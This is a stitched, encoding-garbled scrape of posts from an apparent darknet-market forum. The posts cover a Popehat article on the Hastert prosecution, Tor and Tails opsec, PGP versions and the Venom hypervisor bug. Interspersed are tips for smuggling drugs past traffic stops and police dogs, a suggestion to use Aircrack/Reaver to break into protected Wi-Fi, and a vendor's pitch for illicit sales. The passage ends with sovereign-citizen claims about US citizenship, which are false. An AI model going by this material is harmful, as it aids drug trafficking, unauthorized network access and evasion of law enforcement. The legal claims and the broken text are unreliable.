"The Hub Forums","Zaphod","9755.0","2015-06-06T00:36:07","Dennis Hastert And Federal Prosecutorial Power","General Discussion/Legal","Here's an excellent article by lawyer Ken White (who blogs under the name Popehat). I'd suggest reading the original article, becuase it contains a ton of links to further information/cases.   Zaphod  Dennis Hastert And Federal Prosecutorial Power by Ken White Â· May 29, 2015  Categories: Law  This week, federal prosecutors indicted former Speaker of the House Dennis Hastert.  Hastert is charged with two federal crimes: structuring financial transactions to evade IRS reporting requirements in violation of 31 U.S.C. section 5324(a)(3) and lying to the FBI in violation of the notorious 18 U.S.C. section 1001. Both charges reflect the breadth of federal prosecutorial power.  The indictment has mostly inspired chatter about what it doesn't say. Hastert is charged with structuring withdrawals of less than $10,000 (so that they would not be reported to the IRS) so that he could pay off an unidentified person for Hastert's unidentified past misconduct. What past misconduct, or threatened accusation of misconduct, could lead Hastert to pay $3.5 million? The indictment doesn't say, but it has been drafted to imply that the allegation of past misconduct relates to Hastert's job as a teacher and coach in Yorkville, Illinois. Hastert isn't charged with doing anything to the accuser, and the accuser isn't charged with extortion.  As Radley Balko has pointed out, structuring (or ""smurfing"") charges are extremely flexible. They demonstrate the reality of how Americans targeted by the Department of Justice can be charged. We imagine law enforcement operating like we see on TV: someone commits a crime, everyone knows what the crime is, law enforcement reacts by charging them with that crime. But that's not how federal prosecution always works. Particularly with high-profile targets, federal prosecution is often an exercise in searching for a theory to prosecute someone that the feds would like to prosecute. There is an element of creativity: what federal statute can we find to prosecute this person?  We'll learn more about the reasons for Hastert's payments in the course of the case (or through Department of Justice leaks calculated to harm him). I suspect we'll find that the investigation happened like this: the feds heard that Hastert was paying someone off based on an accusation of old misconduct, determined that the misconduct was too old (or out of their jurisdiction) to prosecute, and started subpoenaing records and interviewing witnesses until they found some element of what he was doing that was a federal crime. In other words, they targeted the man, and then looked for the crime.  The problem with this scenario is that federal criminal law is extremely broad. Practically speaking, it gives federal prosecutors vast discretion to determine who among us faces criminal charges. If you think that you're safe because you've never committed a crime, you may learn to your surprise that you're wrong.  The rational response to this situation is clear: don't trust the feds, don't talk to the feds. But Dennis Hastert, like many accomplished people, believed he could talk his way out of the situation. When the FBI came to interview him, he didn't refuse to answer and call his lawyer. According to the indictment, he confirmed in response to an FBI agent's question that he was withdrawing cash in order to store it because he didn't feel the banking system was safe. For that, he's been charged with lying to federal agents.  This is another aspect of the federal government's vast prosecutorial discretion. Hastert's alleged false statement happened in December 2014. When agents interviewed him, I guarantee you that the feds had already made their case. They had already put witnesses before the grand jury, they had already used grand jury subpoenas to get Hastert's bank records, they already knew exactly how they would charge and prove up the structuring charge. When they went to interview Hastert, there were only three possible outcomes: he would refuse to talk, he would confess, or he would lie in a way they could easily disprove. They were looking either for the confession, which would make their case easier, or the lie, that would give them a new theory on which to charge him with a crime. Under Section 1001 a lie must be material to be criminal. But the materiality element is weak. It only requires the government to show that the lie is the sort of statement that could conceivably influence the FBI. It doesn't require the government to show that the lie actually had any impact whatsoever. Thus the FBI can show up with its case ready to indict, fish for a lie that they know is a lie, and pile that charge on top of whatever the substantive charge is. That's why I bring up Section 1001 so often and explain why it means you must shut up. You can be prosecuted for as little as saying ""no, I didn't"" in response to a already-documented accusation.  The criminal justice system needs to be able to prosecute perjury â lies under oath before a tribunal. And I can see why it needs to be able to punish false statements to the federal government that represent an attempt to commit fraud (say, false statements to get a passport) or that impact an investigation (say, a false accusation that triggers an inquiry).  But ask yourself: what is the legitimate basis for giving the feds the power to prosecute people for exculpatory lies that have no impact whatsoever on their operation?  From the federal government's perspective, the basis is clear: it's a tool to help them charge people they want to charge.   From the citizen's perspective, this situation points to one obvious conclusion: shut up. Never answer a federal agent's questions without a thorough debriefing with a qualified lawyer first.

Do you think they're being watched? They most certainly are. Just like any other exit node. However, by blacklisting these exit nodes, you're also blacklisting the countries with a large amount of exit nodes. Check out this link:   Graphic of Tor exit nodes by country  https://metrics.torproject.org/bubbles.html#country-exits-only  Eyeballing the data, they represent about 40% or so of the nodes. By excluding these exit nodes, it means that the circuit you construct is far, far more predictable. There's an interesting discussion about this on StackExchange:     Reference:  https://security.stackexchange.com/questions/48502/tor-traffic-correlation-attacks-by-global-adversaries    Or maybe you think that they're more likely to be malicious or compromised? Because if that's your concern, you should be more focussed on Russia. Although the number of malicious nodes wasn't that high, by far the majority of them were located in Russia. Refer to this paper:   Spoiled Onions: Exposing Malicious Tor Exit Relays http://www.cs.kau.se/philwint/spoiled_onions/pets2014.pdf  --> Page 13 has a table of detected malicious nodes  I have spent a lot of time fucking around with the torrc file to make it ""better""  and after several months of doing so, ended up with a configuration that was essentially the same as the original torrc file. My point: the default settings for end-use are indeed the most optimal. To put it another way: we all know a thing or two about computers, but  the people behind the Tor Project aren't stupid and have a large team working on this very issue. I personally would trust their judgement regarding Tor configuration than my own speculation, regardless of how reasonable this speculation might be to me.   The Cliff's Notes of it all: Windows and Tor should never feature in ANY sentence when it comes to security.. Instead, use TAILs on a live USB, use HTTPS everywhere (ships with TBB), disable javascript by default on NoScript and try not to fuck around too much with the default configuration of the system.    ","Quote from: paracelsus on September 21, 2014, 02:46:22 pmOnionShop your settings are extremely dangerous, particularly regarding altering the location of exit nodes. I'm not trying to be a cunt (although I typically am). When I have a chance the next few days I will re-type the gist of it.you mean the settings in the torcc? I got those tips on some forum where they discussed this vulnerability of tor where they could demask users over long periods of time. Thought it made sense to exclude nodes from those countries.;In my opinion, this is an opinion-based question. Why? Because it does make sense to filter rouge exit nodes, but how do you know which ones are and which ones aren't? Where do you draw the line in your approach?Excluding exit nodes by country means that you'll eventually want to exclude all U.S. nodes (especially after all of latest NSA news). Then you'd want to exclude other NSA-friendly countries like Australia (https://www.wsws.org/en/articles/2013/07/10/aust-j10.html) and New Zealand (http://www.3news.co.nz/Top-secret-NSA-program-has-links-to-NZ/tabid/417/articleID/307188/Default.aspx). After that, it only makes sense to exclude other U.S. allies, like the UK, Saudi Arabia, Jordan, Israel, and NATO countries. That will shave off more than 90% of the exit nodes in the world. You'll end up with a handful of exit nodes, now guess what will happen then?Yes, you've probably guessed right. Excluding nodes based on country to avoid surveillance will lead to fewer and fewer frequently used nodes, and thus easier surveillance. "

Anonymity and security are time-consuming. Checking to see if your cpu has vpro capability a major issue for any particular laptop. Generally speaking, if you're worried about vpro, then you'd necessarily be worried about Intel AMT, etc. These are firmware concerns, however, and only for the most careful or the most nerdy. Using Tails as the OS is the first, best precaution to take, regardless of hardware.  I cannot remember who remarked on this earlier in the thread, but a MAC is not the last word in anonymity. Running behind a router, using macchanger (which I think is installed in Tails), swapping out wifi cards, using a cheap usb dongle, etc are all methods to defeat an issue that swamps only the n00bs.  For my two cents, OpSec is 80% not being a dumbass IRL, 20% tech.",""

They are not as good as they used to be but they are definetly better then most laptops. Additionally your going to want to throw away the stock wifi network card and install a network card that's compatible with Monitor Mode. That is if you ever want to use a tool like Airocrack or Reaver to gain access to protected networks.  As for operating system, I suggest using Tails, its probably the most secure out of the box OS you can run. Its a liveCD image so you don't have to install it and risk having incriminating data on your HDD/SSD.  If you really don't want to use Linux because you are a NewB and want to use Windows then I suggest at least full disk encryption. You can use something like Discrypter to fully encrypt your HDD. I suggest using the Serpent algorithm because the NSA is known to be able to hack AES.   If you plan on buying items on the darkweb I suggest to never use your own Internet. While TOR is relatively secure there are known security loopholes in the exit nodes which could potentially make your IP visable.   Also, make sure that you disable Java before connecting to ANY site on TOR. Note, in tails you have to redo this every time you restart.   Tails in a VM isn't always the best idea, if your host computer has a keylogger then all your key presses will be clear as day. Your VM is only going to be as secure as your host OS.   Additionally for maximum protection buy a purpose only laptop that IS NOT touched for anything other then this. Things like your BIOS can be hacked by windows based virus's and make tails virtually useless. If you are planning to become a vender as I infer from your name, your going to want to keep that laptop and the USB/SD card with you at all times because an investigator could easily install a rootkit in a matter of minutes. Remember, they live for that kind of thing.

The encryption ensures that not only can only person with the password read it, but it ensures integrity as well.  Anyway, the script is a work in progress at the moment, but still functions very well.  You should be aware that this does not backup data on the persistent drive. I will probably write a script to transfer data from the persitent drive to the home directory in the near future. Also, the user will have to download and restore electrum manually.  I chose to do this because I am not sure how secure curl or wget is; I was hoping one of the smarter users will let me know which one to use and how to do so safely.  It does save the seed mnemonic so restoration is very easy. Also, I included a lot of error checking  and input validation to helping prevent dumb mistakes. If anyone sees any mistakes let me know or fix them if you want.  Any questions feel free to ask.

Baggy or urban clothing Exposed Arm Tattoos Rims Loud Speakers (where people can hear/feel it on the highway) Solo or many younger/sketchy-looking/suspicious people  All of these things are what people I personally know that have been arrested have had cops tell them was the issue. So what, right? It gives you a clear outline that the antithesis is generally flying under the radar; If you look and act like a lame middle-aged white-collar guy that has 2.5 kids and a golden retreiver. Pick regular times and routes that don't single you out whenever possible. Drive a clean Toyota Corrolla or a Honda Pilot.  Also, that car seat thing is extra, leave some toys in the back seat too, and an empty diaper box in the trunk.

Here, you don't carry drugs on Public transport as the cops run around the place with drug dogs. No concession in regards to that issue.  ""More drugs the can be Safely swallowed"" is operate here.  I can safely swallow a LB of weed. But it would take too long to eat. I could very unsafely eat 200 doses of LSD but it could be done very quickly ... I have considered that I may well have to eat my acid stash while on the road and wonder at how long it would be before they could interview me.

"The Hub Forums","x_x","2991.0","2014-09-29T01:11:29","Driving with drugs (safely) ","General Discussion/Legal","I always drive with drugs, and I get pulled over frequently. I've only been caught with anything illegal once, and it was the first time. I've even had a dog hit on my car to no avail on the pigs part. I'll share some of my tactics.    1. No smell.  For personal use amounts I will use ziplock and mylar. For large quantities multiple vac seal and mylar.  2. Stash spot. The article posted earlier rang very true to me, because I first realized how many stash spots were in a car while taking the interior of one apart for customization. Anyway is a whole lot of dead space inside a car, door panels, center console, behind the head unit, etc. Obviously each car varies. You just have to get creative.  Start taking panels apart and see what happens. Put your drugs in the stash spot before you start driving. Once your getting pulled over it is too late. Most traffic stops won't (probably ""can't"" by legal terms) result in a tearing apart of your interior.   3. Don't do anything that can get you arrested. As others have stated, remain sober. Also, talk to the police as little as possible. If you feel the blood sucker is asking probing questions that are not relevant to the traffic stop, tell that fucker. If you get uncomfortable refuse to answer any more questions or even speak at all. I would like to say that you do still need to follow instructions, including to step out of the vehicle. YOU DO NOT HAVE TO SPEAK! Keep your hands visible at all times.  4. Never consent to a search. I can't believe no one has mentioned this. Be adamant about not CONSENTING TO ANY SEARCH. Use those words as that is part of their legal jargon and will help in court if you do end up getting arrested.  5. Use a dash cam. That's right, record the entire trip. You will be amazed at the difference in a traffic stop when the vulture knows that he/she is being recorded. Ask any truck driver. Also, it help to prove your case that there was no liable cause to search in the first place and anything found in said search in fruit of the forbidden tree. You can find these pretty cheap on newegg, and you can buy them with bitcoin. Get one with nightvision and audio recording as well. Make sure it doesn't power down when you turn the ignition off.  6. Be confident and never waiver. When I got pulled over (I was profiled, I didn't violate any laws but the bastards said I crossed the dotted line twice. Had I been recording I could have easily refuted that if need be) my drivers license was checked along with my registration. After that they asked me to step out and then asked if there was anything illegal in the car. There was in fact a bowl, a grinder, and a quarter of stinky weed. Ofc I told them ""no"". Then they asked to search and I said ""no."" They asked me why, and I said because I didn't have to and I didn't have to justify myself. Then they pulled the dog out to go around the car. They did a false hit on the car (I know because my shit was in mbb, and I've seen many fake dog hits vs. true hits), and said that gave them permission to search. Now they say, ""Just tell us where it is and you'll be alright. We're only looking for big stuff. Blah. Blah."" I stick to my guns and say nothing.  One tore my car apart for 25 minutes, while the other steadily tried to convince me to rat on myself. After checking everywhere obvious (and the lying predators knowing that they did a fake hit), they let me go.   90% of arrests are because of people ratting on themselves or others because of police manipulation. Police do very little work and are generally idiots. Don't put yourself in prison. Fuck the cops. ",""

"The Hub Forums","barryzub","7499.0","2015-03-24T23:07:35","How do vendors use reddit without compromising their IP?","General Discussion/Security"," Yes, no, no ... however, that is only true if you assume that javascript attack would restrict itself to javascript and would not use javascript to exploit the browser itself and break into the machine that runs the torbrowser. Exploiting javascript engine to get into the machine that runs the host is relatively easy and from there on your VM is compromised at least, which opens doors to many fun attacks ...  So in short: remember that javascript attacks are not limited to use the official features in javascript/browser, but rather can be misused to get access to your host far easier than pure html websites. If you feel its ok to have a friend on whatever machine you are running the browser on, then you are safe; otherwise, keep javascript off and hope for no exploit in pure html rendering engine of browser.

We will never join unless","General Discussion/Security","I would like to say, i perhaps have to retract what was said in this post title,   at the end of the day, there are too many people relying on us to simply take a stand and wait it out until a market implements the correct payment systems,  but what we will be doing is, requiring finalization on all markets that do not implement p2p escrow, we have been vending much longer than any market that is currently in operation, it makes no sense to trust them more than you would us. People forgot before these markets popped up, direct payments were the only way to do things, and people were highly successful.  The main people that lose out when a market is shut is the vendor, we process orders on a daily basis, so we are the ones who make the loss, and if you were to make a purchase on the day it shut, the buyer would make a loss too, but that risk is considerably lower than what the vendor faces having orders in escrow for 2 weeks +  on tor market we lost $100k+ that was in escorw (all orders were shipped prior), on SR1 we had around $250k in escrow, which subsequently would have been worth around $2.5m in the days after SR closed.  With costs that we pay in R&D, intermediate costs and the large amounts we pay to our re shippers to keep them loyal to us and bring you the best service, you must understand these blows can be huge as a vendor. And yet, every time we pick ourselves up and come back looking to improve on what we had before. All we ask is that you support us in this and you will be rewarded greatly.   Our team is currently working on a site of our own, and has been for several months now, it will have the potential to change the game completely, we have huge financial backing to make this into a safe successful platform for everyone to use, look at the money we have lost in the past, for us to create this platform is priceless to us and so it will not be done for a quick buck like these other sites that have popped up. It will benefit everyone. With the focus primarily on security, customer service and functionality.  SW",""

It's not something I've ever really seen discussed anywhere else.  Snooping on Text by Listening to the Keyboard: https://www.schneier.com/blog/archives/2005/09/snooping_on_tex.html  Fascinating research out of Berkeley. Ed Felten has a good summary:      Li Zhuang, Feng Zhou, and Doug Tygar have an interesting new paper showing that if you have an audio recording of somebody typing on an ordinary computer keyboard for fifteen minutes or so, you can figure out everything they typed. The idea is that different keys tend to make slightly different sounds, and although you don't know in advance which keys make which sounds, you can use machine learning to figure that out, assuming that the person is mostly typing English text. (Presumably it would work for other languages too.)  Read the rest.  The paper is on the Web. Here's the abstract:      We examine the problem of keyboard acoustic emanations. We present a novel attack taking as input a 10-minute sound recording of a user typing English text using a keyboard, and then recovering up to 96% of typed characters. There is no need for a labeled training recording. Moreover the recognizer bootstrapped this way can even recognize random text such as passwords: In our experiments, 90% of 5-character random passwords using only letters can be generated in fewer than 20 attempts by an adversary; 80% of 10-character passwords can be generated in fewer than 75 attempts. Our attack uses the statistical constraints of the underlying content, English language, to reconstruct text from sound recordings without any labeled training data. The attack uses a combination of standard machine learning and speech recognition techniques, including cepstrum features, Hidden Markov Models, linear classification, and feedback-based incremental learning.

"The Hub Forums","akitkat","2981.0","2014-04-28T03:40:11","Snooping on Text by Listening to the Keyboard","General Discussion/Security","Glad to see this being discussed. Most of us walk around with a very powerful microphone....a cellphone. GA Tech researchers were able to detect keystrokes based of vibrations from the accelerometer a few years ago. These are only in most modern, touch screen, phones. Their originally used to detect the orientation of the phone to flip the screen automatically, orientation in GPS and some games. This application of pickup vibrations is limited to when the phone is on the same surface as the keyboard. Three letter agencies wouldn't sink much money into this but...  This new application of using the microphone to decifer keystrokes is a huge step towards to supreme mass surveilance. They could theoretically sample all the keyboards in the world, which wouldnt be so far fetched since most brands feel(sound) very similar. They wouldnt even have to be exact with the words. Most of you guys have seen 'taht eamil wehre letres dnot hvae' to be in correct order to understand them. Very negative development indeed. All phones pickup more sound than one hears via the speaker on phones. The more advanced phones seem to pickup a subtantial amount of sound from the microphones compared to older models.   How many of you guys have a phone in a rather close proximity of your computer (cellphone or landline)? Most people can test whether or not your celllphone are vulnerable to these types of surveilance. Using a voice recording app thats available on most modern phones would be one way, or make a dummy phone call with another phone. Building or buying a faraday enclosure (google it) for ones cell phone can make sure they aren't able to monitor your keystrokes. Unless they were amazing and able to record offline keystrokes as well. A person would have to be rather high on their shit list to receive that kind of treatment though...totally possible though. Fun stuff!!",""

"The Hub Forums","Hansmann","8971.0","2015-05-13T23:22:00","Hack almost any virtual server","General Discussion/Security"," Move over, Heartbleed. There's a new catastrophic vulnerability in town.  A security research firm is warning that a new bug could allow a hacker to take over vast portions of a datacenter -- from within.  The zero-day vulnerability lies in a legacy common component in widely-used virtualization software, allowing a hacker to infiltrate potentially every machine across a datacenter's network.  Read more: For Venom security flaw, the fix is in: Patch your VM today  Most datacenters nowadays condense customers -- including major technology companies and smaller firms -- into virtualized machines, or multiple operating systems on one single server. Those virtualized systems are designed to share resources but remain as separate entities in the host hypervisor, which powers the virtual machines. A hacker can exploit this newly-discovered bug, known as ""Venom"" -- an acronym for ""Virtualized Environment Neglected Operations Manipulation"" -- to gain access to the entire hypervisor, as well as every network-connected device in that datacenter.  Before Heartbleed: Worst vulnerabilities ever?  There have been some pretty bad vulnerabilities before Heartbleed. Is it really any more severe than CodeRed or Blaster?      Read More  The cause is a widely-ignored, legacy virtual floppy disk controller that, if sent specially crafted code, can crash the entire hypervisor. That can allow a hacker to break out of their own virtual machine to access other machines -- including those owned by other people or companies.  The bug, found in open-source computer emulator QEMU, dates back to 2004. Many modern virtualization platforms, including Xen, KVM, and Oracle's VirtualBox, include the buggy code.  VMware, Microsoft Hyper-V, and Bochs hypervisors are not affected.  ""Millions of virtual machines are using one of these vulnerable platforms,"" said CrowdStrike's Jason Geffner, the researcher who found the bug, in a phone interview Tuesday.  The flaw may be one of the biggest vulnerabilities found this year. It comes just over a year after the notorious Heartbleed bug, which allowed malicious actors to grab data from the memory of servers running affected versions of the open-source OpenSSL encryption software.  ""Heartbleed lets an adversary look through the window of a house and gather information based on what they see,"" said Geffner, using an analogy. ""Venom allows a person to break in to a house, but also every other house in the neighborhood as well.""  Geffner said that the company worked with software makers to help patch the bug before it was publicly disclosed Wednesday. As many companies offer their own hardware and software, patches can be applied to thousands of affected customers without any downtime.  Now, he said, the big concern is companies that run systems that can't be automatically patched. 2014 in security  2014 in security: The biggest hacks, leaks, and data breaches  Hundreds of millions of records have been stolen this year through hacks and data breaches as a result of poor, or flawed security. Here are the most notable stories of the year.      Read More  To take advantage of the flaw, a hacker would have to gain access to a virtual machine with high or ""root"" privileges of the system. Geffner warned that it would take little effort to rent a virtual machine from a cloud computing service to exploit the hypervisor from there.  ""What an adversary does from that position is dependent on the network layout,"" said Geffner, indicating that a datacenter takeover was possible.  Dan Kaminsky, a veteran security expert and researcher, said in an email that the bug went unnoticed for more than a decade because almost nobody looked at the legacy disk drive system, which happens to be in almost every virtualization software.  ""It's definitely a real bug for people running clouds to patch against,"" said Kaminsky. ""It shouldn't be too much of a headache as the big providers who might expose systemic risk have all addressed the flaw.""  As the bug was found in-house at CrowdStrike, there is no publicly known code to launch an attack. Geffner said the vulnerability can be exploited with relative ease, but said developing the malicious code was ""not trivial.""  From the point of disclosure in late April, it's taken companies about two weeks to begin patching affected systems.  Rackspace said in an emailed statement that it was notified of the vulnerability that affects a ""portion"" of its cloud servers, and that its systems are patched.  Oracle, which develops VirtualBox, said in an emailed statement that the company was ""aware"" of the problem, and fixed the code, adding that it will release a maintenance update soon.  ""We will release a VirtualBox 4.3 maintenance release very soon. Apart from this, only a limited amount of users should be affected as the floppy device emulation is disabled for most of the standard virtual machine configurations,"" said software lead Frank Mehnert.  A spokesperson for Oracle declined to comment.  A spokesperson for The Linux Foundation, which runs the Xen Project, declined to comment on specifics, but noted that a security advisory was published.","Quote from: The Real SIGAINT on May 13, 2015, 11:09:27 pmOkay, this is exactly why we only use bare-metal servers.http://www.zdnet.com/article/venom-security-flaw-millions-of-virtual-machines-datacenters/This flaw has been there since 2004.

Clearnet source: https://www.reddit.com/r/netsec/comments/35tnv8/venom_a_major_vulnerability_in_qemu_enables/cr8lc44","Qubes is not affected for two reasons. First, most domains are PV domains, which do not rely on QEMU, and thus do not get hit by this bug, at all. Second, and more importantly, HVM domains (for Windows, etc.) are run as stub domains, in which QEMU is not run in dom0, but instead runs in its own domain under MiniOS. So, when VENOM or some other attack breaks through the QEMU emulation layer, the attacker is still contained in a guest domain, rather than having direct access to dom0.VENOM-type attacks on bugs and overflows in QEMU device emulation were readily foreseeable, and it is foolish to run QEMU as a process in dom0. Xen has offered the stub domain alternative for some time; I'm not aware of KVM having any such option. The great thing is that the Qubes engineering team was on top of this long ago, and made the choice to go with stub domains. It truly is an underappreciated project."

"The Hub Forums","morphone","5566.0","2014-11-28T13:04:00","USB Encryption","General Discussion/Security"," Have been reading a lot of guides lately, trying to figure out what I'm doing here on the DW.  The guide he references (http://i25c62nvu4cgeqyz.onion/viewtopic.php?id=6531) is actually talking about PGP versions.  There seems to be a lot of good information in it.  It says you can be identified as Window/Mac/Linux user by the version number of the PGP you are using.  It also goes on to list some different PGP versions that you may want to avoid, as they are easily cracked and exploited.  Copied a bit and threw it down below.  ------------------------------------------------- Versions that should make you nervous:  Version: 9.9.0.397  This person is using the official PGP version, as published by Symantec. I've read statements by Kevin Mitnick that he no longer trusts PGP, since it was acquired by Symantec.   In his post, Mitnick refers to the case of Diskreet, which back in the early days, was an encryption package sold by Symantec. This software purported to use the full 56-bit DES cipher algorithm, which was quite strong for its day. Mitnick stated that he acquired a copy of the Diskreet source code, and discovered that the actual key was nowhere near 56-bits, but was incredibly weak. He went on to say that based on his experience, he would not trust any version of PGP published by Symantec.  His caution is only underscored by the Snowden revelations earlier this Summer, which set out the NSA's campaign of attempting to weaken or backdoor crypto. I, for one, would not trust any closed-source crypto software published by an American company -- that goes double for companies with a history like Symantec.  To the best of my knowledge, Symantec does not publish PGP source code, and as an American company, their crypto software is now suspect.  Versions of PGP  that should make you run away screaming:  Versions of PGP with these Version: strings are based on the BouncyCastle Java crypto libraries. They should be avoided like the plague.  Version: BCPG v1.45 Version: BCPG v1.47  These versions of PGP are absolutely NOTORIOUS for generating MASSIVELY UNSAFE PGP keys by default. These versions typically generate DSS/Elgamal keys with signing keys with a size of 1024-bits, and an encryption sub-key of as little as 512-bits.  512-bit keys are so unsafe, that they were being broken by hobbyists on spare hardware a dozen years ago. 1024-bit keys were deprecated by NIST more than 3 years ago.  Version: BCPG C# v1.6.1.0 Copied from SR2 forums and credit goes to OP.  This version of PGP generates by default a PGP key of 1024-bits, with NO encryption sub-key. Again, these keys are unsafe/obsolete. ----------------------------------------------------------------  ","Quote from: Cocked Pistol on October 18, 2014, 12:55:56 pmThanks OnionshopI will name it ""Political Points of View- John King"" Just to make sure anybody digs aroundI keep my porn in a file labeled ""Tax Documents '98""Edit: To actually contribute to the topic though, the statement 'not all PGP is created equal' probably has something to do with open source v.s not open source.

Â§Â§3111 and 3112.  Within the Internal Revenue Code, people born in the federal zone or living there are described as being ""subject to its jurisdiction"" rather than ""subject to the jurisdiction"": ""c) Who is a citizen.

For other rules governing the acquisition of citizenship, see chapters 1 and 2 of title III of the Immigration and Nationality Act (8 U.S.C. 1401â1459). ""  [26 C.F.R.  Â§1.1-1(c)] This area includes the District of Columbia, the territories and possessions of the United States, and the federal areas within states.  If you were born in a state of the Union and are domiciled there, you are not subject to federal jurisdiction unless the land you maintain a domicile on was ceded by the state to the federal government.  Therefore, you are not and cannot be a âcitizenâ under federal law.  If you arenât a âcitizenâ, then you also canât be claiming your children as âcitizensâ on IRS returns either! A ânationalâ, on the other hand, is simply someone who claims allegiance to the political body formed within the geographical boundaries and territory that define a âstateâ. 8 U.S.C. Â§1101: Definitions (a) The term ''national'' means a person owing permanent allegiance to a state. A âstateâ is then defined as follows: âState.  A people permanently occupying a fixed territory bound together by common-law habits and custom into one body politic exercising, through the medium of an organized government, independent sovereignty and control over all persons and things within its boundaries, capable of making war and peace and of entering into international relations with other communities of the globe.  United States v.

They both describe the political body who, according to our republican institutions, form the sovereignty, and who hold the power and conduct the government through their representatives. They are what we familiarly call the 'sovereign people,' and every citizen is one of this people, and a constituent member of this sovereignty. ...""   [Boyd v. State of Nebraska, 143 U.S. 135 (1892)]  ""From the differences existing between feudal sovereignties and Government founded on compacts, it necessarily follows that their respective prerogatives must differ. Sovereignty is the right to govern; a nation or State-sovereign is the person or persons in whom that resides. In Europe the sovereignty is generally ascribed to the Prince; here it rests with the people; there, the sovereign actually administers the Government; here, never in a single instance; our Governors are the agents of the people, and at most stand in the same relation to their sovereign, in which regents in Europe stand to their sovereigns. Their Princes have personal powers, dignities, and pre-eminences, our rulers have none but official; nor do they partake in the sovereignty otherwise, or in any other capacity, than as private citizens.""  [Chisholm, Ex'r. v. Georgia, 2 Dall. (U.S.)  419, 1 L.ed. 454, 457, 471, 472) (1794)] The supreme Court of the United States described and compared the differences between âcitizenshipâ and âallegianceâ very succinctly in the case of Talbot v. Janson, 3 U.S. 133 (1795): âYet, it is to be remembered, and that whether in its real origin, or in its artificial state, allegiance, as well as fealty, rests upon lands, and it is due to persons. Not so, with respect to Citizenship, which has arisen from the dissolution of the feudal system and is a substitute for allegiance, corresponding with the new order of things. Allegiance and citizenship, differ, indeed, in almost every characteristic. Citizenship is the effect of compact; allegiance is the offspring of power and necessity. Citizenship is a political tie; allegiance is a territorial tenure. Citizenship is the charter of equality; allegiance is a badge of inferiority. Citizenship is constitutional; allegiance is personal. Citizenship is freedom; allegiance is servitude. Citizenship is communicable; allegiance is repulsive. Citizenship may be relinquished; allegiance is perpetual. With such essential differences, the doctrine of allegiance is inapplicable to a system of citizenship; which it can neither serve to controul, nor to elucidate. And yet, even among the nations, in which the law of allegiance is the most firmly established, the law most pertinaciously enforced, there are striking deviations that demonstrate the invincible power of truth, and the homage, which, under every modification of government, must be paid to the inherent rights of manâ¦..The doctrine is, that allegiance cannot be due to two sovereigns; and taking an oath of allegiance to a new, is the strongest evidence of withdrawing allegiance from a previous, sovereignâ¦.â   [Talbot v. Janson, 3 U.S. 133 (1795) ] A ânationalâ is not subject to the exclusive legislative jurisdiction and general sovereignty of the political body, but indirectly is protected by it and may claim its protection.  For instance, when we travel overseas, we are known in foreign countries as âAmerican Nationalsâ or: 1.   ânationals of the United States**â under 8 U.S.C. Â§1101(a)(22)(B), if we were born in a federal possession, such as American Samoa or Swainâs Island.  2.   ânationalsâ, or âstate nationalsâ, or ânationals of the United States*** of Americaâ under 8 U.S.C. Â§1101(a)(21)  if we were born in and are domiciled in a state of the Union.  3.   ânationals but not citizensâ under 8 U.S.C. Â§1452  if we were born in U.S. possessions such as American Samoa or Swainâs Island. Here is the definition of a ânational of the United States**â that demonstrates this, and note paragraph (a)(22)(B): TITLE 8 > CHAPTER 12 > SUBCHAPTER I > Sec. 1101.  Sec. 1101. - Definitions (a) (22) The term ''national of the United States'' means (A) a citizen of the United States, or (B) a person who, though not a citizen of the United States, owes permanent [but not necessarily exclusive] allegiance to the United States.  Consequently, the only time a ânationalâ can also be described as a âcitizenâ is when he is domiciled within the territorial jurisdiction of the political body.  Being a ânationalâ is therefore an attribute and a prerequisite of being a âcitizenâ, and the term can be used to describe âcitizensâ, as indicated above in paragraph (A).  For instance, 8 U.S.C. Â§1401  describes the citizenship of those born within or residing within federal jurisdiction, and note that these people are identified as both âcitizensâ and ânationalsâ. TITLE 8 > CHAPTER 12 > SUBCHAPTER III > Part I > Sec. 1401. Sec. 1401. - Nationals and citizens of United States at birth  The following shall be nationals and citizens of the United States at birth:  (a) a person born in the United States, and subject to the jurisdiction thereof;  (b) a person born in the United States to a member of an Indian, Eskimo, Aleutian, or other aboriginal tribe: Provided, That the granting of citizenship under this subsection shall not in any manner impair or otherwise affect the right of such person to tribal or other property;  When âcitizensâ move their domicile outside of the territorial limits of the âstateâ to which they are a member and cease to participate directly in the political functions of that âstateâ, however, they become ânationalsâ but not âcitizensâ under federal law.  This is confirmed by the definition of âcitizen of the United Statesâ found in Section 1 of the Fourteenth Amendment.: U.S. Constitution: Fourteenth Amendment Section. 1. All persons born or naturalized in the United States and subject to the jurisdiction thereof, are citizens of the United States and of the State wherein they reside.  As you will learn later, the Supreme Court said in the case of U.S. v. Wong Kim Ark, 169 U.S. 649 (1898)  that the term âsubject to the jurisdictionâ means âsubject to the political jurisdictionâ, which is very different from âsubject to the legislative jurisdictionâ.  Note from the above that being a âcitizenâ has two prerequisites: âborn within the [territorial] jurisdictionâ and âsubject to the [political but not legislative] jurisdictionâ.  The other noteworthy point to be made here is that the term ""citizen"" as used above is not used in the context of federal statutes or federal law, and therefore does not imply one is a ""citizen"" under federal law.  The Constitution is what grants the authority to the federal government to write federal statutes, but it is not ""federal law"" or a ""federal statute"".  The term ""citizen"", in the context of the Constitution, simply refers to the political community created by that Constitution, which in this case is the federation of united states called the ""United States"", and not the United States government itself. When you move your domicile outside the territorial jurisdiction of the political body and do not participate in its political functions as a jurist or a voter, then you are no longer âsubject to the [political] jurisdictionâ.  Likewise, because you are outside territorial limits of the political body, you are also not subject in any degree to its legislative jurisdiction either: ""Judge Story, in his treatise on the Conflicts of Laws, lays down, as the basis upon which all reasonings on the law of comity must necessarily rest, the following maxims: First 'that every nation possesses an exclusive sovereignty and jurisdiction within its own territory'; secondly, 'that no state or nation can by its laws directly affect or bind property out of its own territory, or bind persons not resident therein, whether they are natural born subjects or others.'  The learned judge then adds: 'From these two maxims or propositions there follows a third, and that is that whatever force and obligation the laws of one country have in another depend solely upon the laws and municipal regulation of the latter; that is to say, upon its own proper jurisdiction and polity, and upon its own express or tacit consent.""  Story on Conflict of Laws Â§23."" [Baltimore & Ohio Railroad Co. v. Chambers, 73 Ohio St. 16; 76 N.E. 91; 11 L.R.A., N.S., 1012 (1905)] The word âterritoryâ above needs further illumination.  States of the Union are NOT considered âterritoriesâ or âterritoryâ under federal law.  This is confirmed by the Corpus Juris Secundum legal encyclopedia, which says on this subject the following: Volume 86, Corpus Juris Secundum Legal Encyclopedia Territories Â§1. Definitions, Nature, and Distinctions The word 'territory,' when used to designate a political organization has a distinctive, fixed, and legal meaning under the political institutions of the United States, and does not necessarily include all the territorial possessions of the United States, but may include only the portions thereof which are 